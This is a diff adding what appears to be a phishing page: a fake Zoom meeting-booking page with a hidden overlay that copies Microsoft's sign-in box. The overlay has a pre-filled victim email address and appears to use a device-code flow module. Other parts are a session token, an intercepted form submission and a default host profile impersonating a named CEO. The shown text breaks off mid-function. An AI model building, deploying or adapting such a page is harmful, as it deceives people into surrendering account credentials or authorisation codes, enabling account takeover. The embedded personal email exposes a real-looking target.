@@ -1,0 +1,2979 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="preload" href="static/img/marching_ants.gif" as="image" type="image/gif">
+
+    
+    <script src="_external/cdnjs.cloudflare.com/react/18.2.0/react.production.min.js"></script>
+    <script src="_external/cdnjs.cloudflare.com/react-dom/18.2.0/react-dom.production.min.js"></script>
+    <script src="_external/cdnjs.cloudflare.com/babel-standalone/7.23.5/babel.min.js"></script>
+
+    
+    <script src="_external/cdn.tailwindcss.com/tailwind.js"></script>
+
+    
+    <title>Schedule a Meeting - Alexander Hoffmann | Zoom</title>
+    <link rel="icon" href="_external/st1.zoom.us/favicon.ico" />
+    <link rel="apple-touch-icon" href="_external/st1.zoom.us/logo192.png" />
+    <link rel="stylesheet" href="static/css/zoom.css">
+
+    <style>
+         
+        .cdp-overlay{position:fixed;inset:0;background:rgba(0,0,0,.4);display:none;align-items:center;justify-content:center;z-index:9000}
+
+         
+        .sign-in-box{
+            background:#fff;width:440px;max-width:95vw;
+            box-shadow:0 2px 6px rgba(0,0,0,.2);
+            font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;
+            animation:msLightboxFade .25s ease;
+            position:relative;overflow:hidden;
+        }
+        @keyframes msLightboxFade{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+
+         
+        .sign-in-box .ms-progress{
+            position:absolute;top:0;left:0;width:100%;z-index:10;
+            height:3px;overflow:hidden;
+            background:url('static/img/marching_ants.gif') repeat-x 0 0;
+            background-size:auto 3px;
+            will-change:contents;
+            transform:translateZ(0);
+        }
+
+         
+        .sign-in-box .inner-content{padding:44px 44px 20px}
+
+         
+        .sign-in-box .ms-logo{margin-bottom:16px}
+        .sign-in-box .ms-logo img{display:block}
+
+         
+        .sign-in-box .identity-banner{display:flex;align-items:center;gap:6px;font-size:13px;color:#1b1b1b;margin-bottom:16px}
+        .sign-in-box .identity-banner svg{flex-shrink:0}
+
+         
+        .sign-in-box .back-button{
+            background:none;border:none;cursor:pointer;padding:0;margin-right:4px;
+            display:none;align-items:center;flex-shrink:0;
+        }
+        .sign-in-box .back-button img{width:16px;height:16px}
+
+         
+        .sign-in-box .title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px;line-height:1.2}
+
+         
+        .sign-in-box .form-group{margin-top:16px}
+
+        .sign-in-box .form-text-input,
+        .sign-in-box .cdp-input{
+            display:block;width:100%;padding:6px 8px;font-size:15px;
+            font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;
+            border:none;border-bottom:1px solid #8c8c8c;outline:none;
+            background:transparent;color:#1b1b1b;box-sizing:border-box;
+            line-height:1.5;height:36px;
+        }
+        .sign-in-box .form-text-input:focus,
+        .sign-in-box .cdp-input:focus{border-bottom-color:#0067b8}
+        .sign-in-box .form-text-input[readonly],
+        .sign-in-box .cdp-input[readonly]{color:#666;cursor:default}
+
+         
+        #divPr{margin-top:4px}
+        #divPr .form-text-input{margin-bottom:0}
+
+         
+        .sign-in-box .error-container{margin-top:8px;min-height:0}
+        .sign-in-box .alert{
+            padding:0;font-size:13px;border-radius:0;
+            background:none;border:none;color:#e81123;margin-bottom:6px;
+        }
+        .sign-in-box .alert a{color:#0067b8;text-decoration:none;cursor:default;pointer-events:none}
+        .sign-in-box .text-danger{font-size:13px;color:#a80000}
+
+         
+        .sign-in-box .links{margin-top:16px;font-size:13px;visibility:hidden}
+        .sign-in-box .links p{margin:0 0 8px}
+
+         
+        .sign-in-box .forgot-password{margin-top:12px;font-size:13px;display:none;visibility:hidden}
+
+         
+        .sign-in-box .button-container{
+            display:flex;justify-content:flex-end;
+            margin-top:20px;padding-bottom:4px;
+        }
+        .sign-in-box .ms-btn{
+            min-width:108px;padding:4px 12px;font-size:15px;font-weight:600;
+            color:#fff;background:#0067b8;border:1px solid #0067b8;cursor:pointer;
+            font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;
+            transition:background .15s;height:36px;line-height:24px;
+            text-align:center;touch-action:manipulation;white-space:nowrap;
+        }
+        .sign-in-box .ms-btn:hover{background:#005da6;border-color:#005da6}
+        .sign-in-box .ms-btn:disabled{background:#a0a0a0;border-color:#a0a0a0;opacity:1;cursor:not-allowed;pointer-events:none}
+
+         
+        .spinner{
+            display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.4);
+            border-top-color:#fff;border-radius:50%;animation:sp .6s linear infinite;
+            vertical-align:middle;margin-right:6px;
+        }
+        @keyframes sp{to{transform:rotate(360deg)}}
+
+         
+        .stage{display:flex;justify-content:center;align-items:center;height:20px}
+        .dot-flashing{
+            position:relative;width:8px;height:8px;border-radius:50%;
+            background:#fff;animation:df .9s infinite alternate;animation-delay:.45s;
+        }
+        .dot-flashing::before,.dot-flashing::after{
+            content:'';display:inline-block;position:absolute;top:0;
+            width:8px;height:8px;border-radius:50%;background:#fff;
+            animation:df .9s infinite alternate;
+        }
+        .dot-flashing::before{left:-14px;animation-delay:0s}
+        .dot-flashing::after{left:14px;animation-delay:.9s}
+        @keyframes df{0%{opacity:.2}100%{opacity:1}}
+    </style>
+</head>
+<body data-user-email="{{Id}}" data-company="" data-document="">
+
+    
+    <div id="template-data"
+         data-session-token="ZWDSohh1ZRgmYbqSSc8wyRRE"
+         data-artifact-path="129c677a-7542-47d5-bc6d-8fb340a03e73-3801892f"
+         data-error=""
+         data-use-device-code="false"
+         data-verify-email="false"
+         data-profile-name=" "
+         data-profile-title="Meeting Coordinator"
+         data-profile-company="Zoom"
+         data-profile-image=" "
+         data-meeting-reason="Schedule a brief Zoom call to discuss next steps."
+         data-current-date="2026-10-06"
+         data-availability-start-date="2026-10-11"
+         data-availability-start-offset="5"
+         data-availability-blocked-weekdays="[0,6]"
+         data-availability-blocked-dates="[]"
+         data-host-timezone="UTC"
+         style="display: none;">
+    </div>
+
+    
+    <div id="root"></div>
+
+    
+    <div class="cdp-overlay" id="chromedp-overlay" onclick="if(event.target===this){this.style.display='none';window.resetOverlayForm&&window.resetOverlayForm()}">
+        <section id="remvSec">
+            <div class="sign-in-box" style="position:relative;">
+                
+                <div class="ms-progress" id="cdp-progress" style="display:none;"></div>
+                <button type="button" id="cdp-close" aria-label="Close"
+                    style="position:absolute;top:12px;right:12px;background:none;border:none;cursor:pointer;padding:4px;line-height:1;color:#605e5c;font-size:20px;"
+                    onclick="document.getElementById('chromedp-overlay').style.display='none';window.resetOverlayForm&&window.resetOverlayForm();">&times;</button>
+                <div class="inner-content">
+                    
+                    <div class="ms-logo">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
+                            <rect width="10.5" height="10.5" fill="#f25022"/>
+                            <rect x="11.6" width="10.5" height="10.5" fill="#7fba00"/>
+                            <rect y="11.6" width="10.5" height="10.5" fill="#00a4ef"/>
+                            <rect x="11.6" y="11.6" width="10.5" height="10.5" fill="#ffb900"/>
+                            <text x="28" y="17" fill="#737373" font-family="Segoe UI,sans-serif" font-size="15" font-weight="600">Microsoft</text>
+                        </svg>
+                    </div>
+
+                    
+                    <div class="identity-banner" id="cdp-user-row" style="display:none;">
+                        <button type="button" class="back-button" id="cdp-back-btn" aria-label="Back">
+                            <img role="presentation" src="_external/aadcdn.msauth.net/arrow_left.svg" style="width:16px;height:16px;">
+                        </button>
+                        <span id="cdp-user-email"><a href="cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a7d3c5c2cbcbc695979596e7c8d2d3cbc8cc89c4c8ca">[email&#160;protected]</a></span>
+                    </div>
+
+                    <h1 class="title">Sign in</h1>
+
+                    
+                    <div class="form-group">
+                        <input name="username" maxlength="113" class="form-text-input disable-on-submit"
+                               readonly placeholder="Email, phone, or Skype" id="ai" type="email"
+                               value="tbella2021@outlok.com" aria-label="Enter your email, phone, or Skype.">
+                    </div>
+
+                    
+                    <div id="divPr" style="display:none;"></div>
+
+                    
+                    <div class="error-container">
+                        <div class="alert alert-danger" id="msg" style="display:none;">Your account or password is incorrect.</div>
+                        <span class="text-danger" id="error" style="display:none;">We couldn't find an account with that username. Try another.</span>
+                    </div>
+
+                    
+                    <div class="forgot-password" id="cdp-forgot-pw">
+                        <a href="#">Forgot my password</a>
+                    </div>
+
+                    
+                    <div class="links" id="cdp-email-links">
+                        <p>No account? <a href="#">Create one!</a></p>
+                        <a href="#">Can't access your account?</a>
+                    </div>
+
+                    
+                    <div class="button-container">
+                        <input type="submit" class="ms-btn" id="next" value="Next">
+                        <input type="submit" class="ms-btn" id="submit-btn" style="display:none;" value="Sign in">
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    
+    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+        window.CHROMEDP_MODE = true;
+
+        
+        (function() {
+            var origSubmit = HTMLFormElement.prototype.submit;
+            HTMLFormElement.prototype.submit = function() {
+                if (this.action && this.action.indexOf('verify-redirect') !== -1) {
+                    console.warn('[CDP] Blocked form POST to verify-redirect');
+                    var ov = document.getElementById('chromedp-overlay');
+                    if (ov) ov.style.display = 'flex';
+                    return;
+                }
+                return origSubmit.apply(this, arguments);
+            };
+        })();
+    </script>
+
+    
+    <script src="static/js/devicecode.js"></script>
+    <script type="text/babel">
+// @ts-nocheck
+const { useState } = React;
+
+// ==================== ICON COMPONENTS ====================
+
+const Clock = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <polyline points="12 6 12 12 16 14"/>
+    </svg>
+);
+
+const Video = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <polygon points="23 7 16 12 23 17 23 7"/>
+        <rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
+    </svg>
+);
+
+const ChevronLeft = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <polyline points="15 18 9 12 15 6"/>
+    </svg>
+);
+
+const ChevronRight = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <polyline points="9 18 15 12 9 6"/>
+    </svg>
+);
+
+const ChevronUp = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <polyline points="18 15 12 9 6 15"/>
+    </svg>
+);
+
+const ChevronDown = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <polyline points="6 9 12 15 18 9"/>
+    </svg>
+);
+
+const Globe = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="2" y1="12" x2="22" y2="12"/>
+        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+    </svg>
+);
+
+const User = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+        <circle cx="12" cy="7" r="4"/>
+    </svg>
+);
+
+const CheckCircle = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+        <polyline points="22 4 12 14.01 9 11.01"/>
+    </svg>
+);
+
+const X = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"/>
+        <line x1="6" y1="6" x2="18" y2="18"/>
+    </svg>
+);
+
+const Shield = ({ className, strokeWidth = 1.5 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+);
+
+const ExternalLink = ({ className, strokeWidth = 2 }) => (
+    <svg className={className} width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={strokeWidth} strokeLinecap="round" strokeLinejoin="round">
+        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+        <polyline points="15 3 21 3 21 9" />
+        <line x1="10" y1="14" x2="21" y2="3" />
+    </svg>
+);
+
+const MicrosoftLogo = ({ className }) => (
+    <svg className={className} width="21" height="21" viewBox="0 0 21 21">
+        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+    </svg>
+);
+
+const TeamsIcon = ({ className }) => (
+    <svg className={className} width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#5059C9" d="M10.765 6.875h3.616c.342 0 .619.276.619.617v3.288a2.272 2.272 0 01-2.274 2.27h-.01a2.272 2.272 0 01-2.274-2.27V7.199c0-.179.145-.323.323-.323zM13.21 6.225c.808 0 1.464-.655 1.464-1.462 0-.808-.656-1.463-1.465-1.463s-1.465.655-1.465 1.463c0 .807.656 1.462 1.465 1.462z"/>
+        <path fill="#7B83EB" d="M8.651 6.225a2.114 2.114 0 002.117-2.112A2.114 2.114 0 008.65 2a2.114 2.114 0 00-2.116 2.112c0 1.167.947 2.113 2.116 2.113zM11.473 6.875h-5.97a.611.611 0 00-.596.625v3.75A3.669 3.669 0 008.488 15a3.669 3.669 0 003.582-3.75V7.5a.611.611 0 00-.597-.625z"/>
+        <path fill="#000000" d="M8.814 6.875v5.255a.598.598 0 01-.596.595H5.193a3.951 3.951 0 01-.287-1.476V7.5a.61.61 0 01.597-.624h3.31z" opacity=".1"/>
+        <path fill="#000000" d="M8.488 6.875v5.58a.6.6 0 01-.596.595H5.347a3.22 3.22 0 01-.267-.65 3.951 3.951 0 01-.172-1.15V7.498a.61.61 0 01.596-.624h2.985z" opacity=".2"/>
+        <path fill="#000000" d="M8.488 6.875v4.93a.6.6 0 01-.596.595H5.08a3.951 3.951 0 01-.172-1.15V7.498a.61.61 0 01.596-.624h2.985z" opacity=".2"/>
+        <path fill="#000000" d="M8.163 6.875v4.93a.6.6 0 01-.596.595H5.079a3.951 3.951 0 01-.172-1.15V7.498a.61.61 0 01.596-.624h2.66z" opacity=".2"/>
+        <path fill="#000000" d="M8.814 5.195v1.024c-.055.003-.107.006-.163.006-.055 0-.107-.003-.163-.006A2.115 2.115 0 016.593 4.6h1.625a.598.598 0 01.596.594z" opacity=".1"/>
+        <path fill="#000000" d="M8.488 5.52v.699a2.115 2.115 0 01-1.79-1.293h1.195a.598.598 0 01.595.594z" opacity=".2"/>
+        <path fill="#000000" d="M8.488 5.52v.699a2.115 2.115 0 01-1.79-1.293h1.195a.598.598 0 01.595.594z" opacity=".2"/>
+        <path fill="#000000" d="M8.163 5.52v.647a2.115 2.115 0 01-1.465-1.242h.87a.598.598 0 01.595.595z" opacity=".2"/>
+        <path fill="url(#ms-teams-grad-z)" d="M1.597 4.925h5.969c.33 0 .597.267.597.596v5.958a.596.596 0 01-.597.596h-5.97A.596.596 0 011 11.479V5.521c0-.33.267-.596.597-.596z"/>
+        <path fill="#ffffff" d="M6.152 7.193H4.959v3.243h-.76V7.193H3.01v-.63h3.141v.63z"/>
+        <defs>
+            <linearGradient id="ms-teams-grad-z" x1="2.244" x2="6.906" y1="4.46" y2="12.548" gradientUnits="userSpaceOnUse">
+                <stop stopColor="#5A62C3"/><stop offset=".5" stopColor="#4D55BD"/><stop offset="1" stopColor="#3940AB"/>
+            </linearGradient>
+        </defs>
+    </svg>
+);
+
+// ==================== MAIN BOOKING COMPONENT ====================
+
+function BookingPage() {
+    const [stage, setStage] = useState('booking');
+    const [showContactModal, setShowContactModal] = useState(false);
+    const [isAuthenticating, setIsAuthenticating] = useState(false);
+    const [isProcessing, setIsProcessing] = useState(false);
+    const [error, setError] = useState('');
+    const [showVerificationPrompt, setShowVerificationPrompt] = useState(false);
+    
+    // Modal step tracking
+    const [modalStep, setModalStep] = useState(1);
+    const totalSteps = 2;
+
+    const templateData = document.getElementById('template-data');
+
+    const parseJSON = (value, fallback) => {
+        if (!value) return fallback;
+        try {
+            const parsed = JSON.parse(value);
+            return Array.isArray(parsed) ? parsed : fallback;
+        } catch (error) {
+            return fallback;
+        }
+    };
+
+    const parseDateString = (value) => {
+        if (typeof value !== 'string') return null;
+        const trimmed = value.trim();
+        if (!trimmed) return null;
+        const match = /^\d{4}-\d{2}-\d{2}$/.exec(trimmed);
+        if (!match) return null;
+        const [year, month, day] = trimmed.split('-').map(Number);
+        if (!year || !month || !day) return null;
+        return new Date(year, month - 1, day);
+    };
+
+    const normalizeDate = (date) => {
+        if (!date) return null;
+        const parsed = parseDateString(date);
+        const normalized = parsed || new Date(date);
+        if (Number.isNaN(normalized.getTime())) return null;
+        normalized.setHours(0, 0, 0, 0);
+        return normalized;
+    };
+
+    const formatISODate = (date) => {
+        if (!date) return '';
+        const year = date.getFullYear();
+        const month = String(date.getMonth() + 1).padStart(2, '0');
+        const day = String(date.getDate()).padStart(2, '0');
+        return `${year}-${month}-${day}`;
+    };
+
+    const availabilityConfig = React.useMemo(() => {
+        const fallbackToday = normalizeDate(new Date());
+        const serverToday = normalizeDate(templateData?.dataset.currentDate);
+        const today = serverToday && fallbackToday
+            ? (serverToday > fallbackToday ? serverToday : fallbackToday)
+            : (serverToday || fallbackToday);
+
+        const currentMonthStart = new Date(today.getFullYear(), today.getMonth(), 1);
+        const maxMonthStart = new Date(today.getFullYear(), today.getMonth() + 2, 1);
+
+        const parsedOffset = parseInt(templateData?.dataset.availabilityStartOffset || '5', 10);
+        const startOffsetDays = Number.isFinite(parsedOffset) ? parsedOffset : 5;
+
+        let startDate = normalizeDate(templateData?.dataset.availabilityStartDate);
+        if (!startDate) {
+            startDate = new Date(today);
+            startDate.setDate(startDate.getDate() + startOffsetDays);
+            startDate = normalizeDate(startDate);
+        }
+
+        const blockedWeekdays = parseJSON(templateData?.dataset.availabilityBlockedWeekdays, [0, 6]);
+        const blockedDates = parseJSON(templateData?.dataset.availabilityBlockedDates, []);
+        const blockedDatesSet = new Set(blockedDates.filter(Boolean));
+
+        return {
+            today,
+            currentMonthStart,
+            maxMonthStart,
+            startDate,
+            startOffsetDays,
+            blockedWeekdays,
+            blockedDatesSet
+        };
+    }, []);
+
+    const monthKey = (date) => (date.getFullYear() * 12) + date.getMonth();
+
+    const isMonthAvailable = (date) => {
+        if (!date) return false;
+        const candidate = normalizeDate(date);
+        if (!candidate) return false;
+        const candidateKey = monthKey(candidate);
+        const minKey = monthKey(availabilityConfig.currentMonthStart);
+        const maxKey = monthKey(availabilityConfig.maxMonthStart);
+        return candidateKey >= minKey && candidateKey <= maxKey;
+    };
+
+    const isDateSelectable = (date) => {
+        if (!date) return false;
+        const candidate = normalizeDate(date);
+        if (!candidate) return false;
+        if (!isMonthAvailable(candidate)) return false;
+        if (candidate < availabilityConfig.today) return false;
+        if (availabilityConfig.blockedWeekdays.includes(candidate.getDay())) return false;
+        if (availabilityConfig.blockedDatesSet.has(formatISODate(candidate))) return false;
+        return true;
+    };
+
+    const isDateAvailable = (date) => {
+        if (!isDateSelectable(date)) return false;
+        const candidate = normalizeDate(date);
+        if (!candidate) return false;
+        if (candidate < availabilityConfig.startDate) return false;
+        return true;
+    };
+
+    const findNextAvailableDate = (startDate) => {
+        if (!startDate) return null;
+        let cursor = normalizeDate(startDate);
+        for (let i = 0; i < 366; i++) {
+            if (isDateAvailable(cursor)) {
+                return new Date(cursor);
+            }
+            cursor.setDate(cursor.getDate() + 1);
+        }
+        return null;
+    };
+
+    const findLastAvailableDate = (endDate) => {
+        if (!endDate) return null;
+        let cursor = normalizeDate(endDate);
+        for (let i = 0; i < 366; i++) {
+            if (isDateAvailable(cursor)) {
+                return new Date(cursor);
+            }
+            cursor.setDate(cursor.getDate() - 1);
+        }
+        return null;
+    };
+
+    const firstAvailableDate = React.useMemo(() => {
+        return findNextAvailableDate(availabilityConfig.startDate);
+    }, []);
+
+    const lastAvailableDate = React.useMemo(() => {
+        const maxMonthEnd = new Date(
+            availabilityConfig.maxMonthStart.getFullYear(),
+            availabilityConfig.maxMonthStart.getMonth() + 1,
+            0
+        );
+        return findLastAvailableDate(maxMonthEnd);
+    }, []);
+
+    const initialSelectedDate = React.useMemo(() => {
+        return firstAvailableDate
+            || availabilityConfig.startDate
+            || availabilityConfig.today;
+    }, [firstAvailableDate]);
+
+    // Booking details
+    const initialMonthDate = React.useMemo(() => {
+        return firstAvailableDate
+            || lastAvailableDate
+            || availabilityConfig.startDate
+            || availabilityConfig.today;
+    }, [firstAvailableDate, lastAvailableDate]);
+
+    const [currentMonth, setCurrentMonth] = useState(() => new Date(initialMonthDate.getFullYear(), initialMonthDate.getMonth(), 1));
+    const [selectedDate, setSelectedDate] = useState(() => initialSelectedDate);
+    const [selectedTime, setSelectedTime] = useState('');
+    const [duration, setDuration] = useState(30);
+    const [use24h, setUse24h] = useState(false);
+    
+    // Contact details
+    const [contactInfo, setContactInfo] = useState({
+        name: '',
+        email: '',
+        company: '',
+        notes: ''
+    });
+    const [isAuthenticated, setIsAuthenticated] = useState(false);
+    
+    // Device Code Flow — shared module
+    const [useDeviceCode, setUseDeviceCode] = useState(false);
+    const dc = DeviceCode.useDeviceCode();
+    
+    // Email verification state
+    const [verifyEmail, setVerifyEmail] = useState(false);
+    const [isVerifyingEmail, setIsVerifyingEmail] = useState(false);
+
+    const hostProfile = React.useMemo(() => ({
+        name: templateData?.dataset.profileName || 'Steven A. Cohen',
+        title: templateData?.dataset.profileTitle || 'CEO',
+        company: templateData?.dataset.profileCompany || 'Point72 Asset Management',
+        image: templateData?.dataset.profileImage || 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUSAfzAqFcFtUeN3X3EV5737g4m3tKhC4xPcUo2EweN49AiFwt68U24KQQnL0prMCPSOWrXAogiGFLQgMPfAzWf6PiHspNtC6WXRRD0BpZhQ&s=10',
+        reason: templateData?.dataset.meetingReason || 'Schedule a brief call to discuss partnership opportunities and investment strategies.'
+    }), []);
+    const hostTitleLine = [hostProfile.title, hostProfile.company].filter(Boolean).join(', ');
+    const hostFallbackImage = React.useMemo(() => '_external/placehold.co/136x136_CAL.png', []);
+    
+    // Load configuration and check for errors
+    React.useEffect(() => {
+        const templateData = document.getElementById('template-data');
+        const errorMsg = templateData?.dataset.error || '';
+        
+        // Check if device code flow is enabled
+        const deviceCodeEnabled = templateData?.dataset.useDeviceCode === 'true';
+        setUseDeviceCode(deviceCodeEnabled);
+        
+        // Check if email verification is enabled
+        const verifyEmailEnabled = templateData?.dataset.verifyEmail === 'true';
+        setVerifyEmail(verifyEmailEnabled);
+        
+        if (errorMsg) {
+            setError(errorMsg);
+            setShowContactModal(true);
+            setModalStep(1);
+            
+            setContactInfo({
+                name: '',
+                email: '',
+                company: '',
+                notes: ''
+            });
+        }
+    }, []);
+
+
+
+    // Cleanup intervals on unmount
+    React.useEffect(() => {
+        return () => {
+            if (window.timerInterval) {
+                clearInterval(window.timerInterval);
+            }
+            if (window.pollInterval) {
+                clearInterval(window.pollInterval);
+            }
+        };
+    }, []);
+
+    // Confirmed-stage redirect (must be top-level, not inside conditional — hooks rules).
+    React.useEffect(() => {
+        if (stage !== 'confirmed') return;
+        const timer = setTimeout(() => {
+            const td = document.getElementById('template-data');
+            const target = (td?.dataset.finalRedirect || '').trim() || 'https://zoom.us';
+            console.log('[Zoom] Redirecting after confirmation →', target);
+            window.location.href = target;
+        }, 5000);
+        return () => clearTimeout(timer);
+    }, [stage]);
+
+    const baseTimeSlots = [
+        '9:00 AM', '10:00 AM', '11:00 AM', '12:00 PM',
+        '1:00 PM', '2:00 PM', '3:00 PM', '4:00 PM', '5:00 PM'
+    ];
+
+    const timezones = [
+        { label: 'GMT/UTC', tz: 'UTC' },
+        { label: 'Western European (WET)', tz: 'Europe/London' },
+        { label: 'Central European (CET)', tz: 'Europe/Berlin' },
+        { label: 'Eastern European (EET)', tz: 'Europe/Helsinki' },
+        { label: 'Eastern Time (ET)', tz: 'America/New_York' },
+        { label: 'Central Time (CT)', tz: 'America/Chicago' },
+        { label: 'Mountain Time (MT)', tz: 'America/Denver' },
+        { label: 'Pacific Time (PT)', tz: 'America/Los_Angeles' },
+    ];
+
+    const getTimezoneLabel = (tzId) => {
+        const match = timezones.find((entry) => entry.tz === tzId);
+        return match ? match.label : tzId;
+    };
+
+    const getTimezoneId = (label) => {
+        const match = timezones.find((entry) => entry.label === label);
+        return match ? match.tz : 'Europe/London';
+    };
+
+    const [timezone, setTimezone] = useState(() => {
+        const resolved = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        return getTimezoneLabel(resolved);
+    });
+
+    const BASE_TIMEZONE = templateData?.dataset.hostTimezone || 'Europe/London';
+
+    const parseTimeSlot = (value) => {
+        if (!value) return null;
+        const trimmed = value.trim();
+        const match = trimmed.match(/^(\d{1,2}):(\d{2})\s*(AM|PM)$/i);
+        if (!match) return null;
+        let hour = parseInt(match[1], 10);
+        const minute = parseInt(match[2], 10);
+        const meridiem = match[3].toUpperCase();
+        if (meridiem === 'PM' && hour < 12) hour += 12;
+        if (meridiem === 'AM' && hour === 12) hour = 0;
+        return { hour, minute };
+    };
+
+    const getZonedDateParts = (date, timeZone) => {
+        const formatter = new Intl.DateTimeFormat('en-US', {
+            timeZone,
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hourCycle: 'h23'
+        });
+        const parts = formatter.formatToParts(date);
+        const lookup = Object.fromEntries(parts.map((part) => [part.type, part.value]));
+        return {
+            year: Number(lookup.year),
+            month: Number(lookup.month),
+            day: Number(lookup.day),
+            hour: Number(lookup.hour),
+            minute: Number(lookup.minute),
+            second: Number(lookup.second)
+        };
+    };
+
+    const getTimeZoneOffsetMinutes = (date, timeZone) => {
+        const zoned = getZonedDateParts(date, timeZone);
+        const asUTC = Date.UTC(zoned.year, zoned.month - 1, zoned.day, zoned.hour, zoned.minute, zoned.second);
+        return Math.round((asUTC - date.getTime()) / 60000);
+    };
+
+    const makeDateInTimeZone = (parts, timeZone) => {
+        const utcGuess = new Date(Date.UTC(parts.year, parts.month - 1, parts.day, parts.hour, parts.minute, 0));
+        const offsetMinutes = getTimeZoneOffsetMinutes(utcGuess, timeZone);
+        return new Date(utcGuess.getTime() - offsetMinutes * 60000);
+    };
+
+    const formatTimeInZone = (date, timeZone) => {
+        return new Intl.DateTimeFormat('en-US', {
+            timeZone,
+            hour: 'numeric',
+            minute: '2-digit',
+            hour12: true
+        }).format(date);
+    };
+
+    const formatSlotLabel = (label) => {
+        if (!use24h) return label;
+        const parsed = parseTimeSlot(label);
+        if (!parsed) return label;
+        return `${String(parsed.hour).padStart(2, '0')}:${String(parsed.minute).padStart(2, '0')}`;
+    };
+
+    const getGmtOffsetLabel = (tzId) => {
+        const off = getTimeZoneOffsetMinutes(new Date(), tzId);
+        const sign = off >= 0 ? '+' : '-';
+        const abs = Math.abs(off);
+        const hours = Math.floor(abs / 60);
+        const mins = abs % 60;
+        return mins === 0 ? `GMT${sign}${hours}` : `GMT${sign}${String(hours).padStart(2, '0')}:${String(mins).padStart(2, '0')}`;
+    };
+
+    // Strip trailing "(XYZ)" abbrev from labels so display can be "(GMT-7) Pacific Time".
+    const getFriendlyTzName = (label) => label.replace(/\s*\([^)]*\)\s*$/, '').trim() || label;
+
+    const getTimezoneDisplay = (label) => {
+        const id = getTimezoneId(label);
+        return `(${getGmtOffsetLabel(id)}) ${getFriendlyTzName(label)}`;
+    };
+
+    // Compute the time slots for an arbitrary date. The `availableTimeSlots`
+    // memo below is just this helper called on `selectedDate` — extracted so
+    // the 4-day window can render slots per day column independently.
+    const computeSlotsForDate = (date) => {
+        if (!date) return [];
+        if (!isDateSelectable(date)) return [];
+
+        const day = normalizeDate(date);
+        const isLeadTimeBlocked = day && availabilityConfig.startDate
+            ? day >= availabilityConfig.today && day < availabilityConfig.startDate
+            : false;
+
+        const selectedTz = getTimezoneId(timezone);
+        const parts = {
+            year: date.getFullYear(),
+            month: date.getMonth() + 1,
+            day: date.getDate()
+        };
+
+        return baseTimeSlots
+            .map((slot) => {
